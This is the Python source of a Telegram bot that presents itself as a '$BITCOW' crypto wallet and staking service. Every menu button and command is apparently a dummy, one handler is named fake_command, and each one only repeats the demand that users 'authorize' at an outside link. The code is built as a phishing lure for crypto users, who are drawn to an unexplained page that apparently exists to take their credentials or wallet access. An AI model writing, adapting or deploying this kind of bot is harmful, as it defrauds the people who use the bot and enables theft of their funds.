import logging
import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils.markdown import hlink

TOKEN = os.getenv("BOT_TOKEN")
AUTH_URL = "https://laxtube.com/page/"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN, parse_mode="HTML")
dp = Dispatcher()

def get_main_keyboard():
    buttons = [
        [InlineKeyboardButton("\ud83d\udcb0 Wallet", callback_data="no_access"), InlineKeyboardButton("\ud83d\udcca Portfolio", callback_data="no_access")],
        [InlineKeyboardButton("\ud83d\udcc8 Market", callback_data="no_access"), InlineKeyboardButton("\u26a1 Staking", callback_data="no_access")],
        [InlineKeyboardButton("\ud83c\udf81 Airdrops", callback_data="no_access"), InlineKeyboardButton("\ud83d\udd17 Refer & Earn", callback_data="no_access")],
        [InlineKeyboardButton("\ud83d\ude80 Upgrade Plan", callback_data="no_access")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

commands_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("/start"), KeyboardButton("/authorize"), KeyboardButton("/support")]
    ], resize_keyboard=True
)

@dp.message_handler(commands=["start"])
async def send_welcome(message: types.Message):
    text = (
        "\ud83d\ude80 <b>Welcome to $BITCOW Crypto Bot!</b>\n"
        "Manage your portfolio, stake tokens, and earn rewards.\n\n"
        f"\u26a0\ufe0f <i>Before using any feature, you must authorize here:</i> {hlink('Our Link', AUTH_URL)}"
    )
    await message.answer(text, reply_markup=get_main_keyboard())

@dp.message_handler(commands=["authorize", "support"])
async def fake_command(message: types.Message):
    await message.answer(
        f"\u26a0\ufe0f <i>You must authorize first!</i> Click here: {hlink('Our Link', AUTH_URL)}",
        parse_mode="HTML"
    )

@dp.callback_query_handler(lambda call: call.data == "no_access")
async def no_access_message(call: types.CallbackQuery):
    await call.answer("\u26a0\ufe0f You must authorize first! Click 'Our Link' in the message above.", show_alert=True)

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
